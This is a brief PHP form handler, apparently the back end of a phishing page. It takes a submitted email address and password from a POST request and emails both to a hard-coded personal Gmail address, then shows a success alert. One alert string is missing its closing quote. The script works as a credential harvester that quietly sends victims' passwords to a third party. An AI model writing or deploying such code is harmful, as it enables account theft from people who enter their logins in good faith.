<?php
    $email = $_POST['email'];
    $message = $_POST['password'];
    $my_email = "sarath.sattiraju@gmail.com";

    if($email && $message){
        mail($my_email,$email,$message);
        echo "<script>alert('Success');</script>";
    }else{
        echo "<script>alert('Fill the fields!)</script>";
    }
?>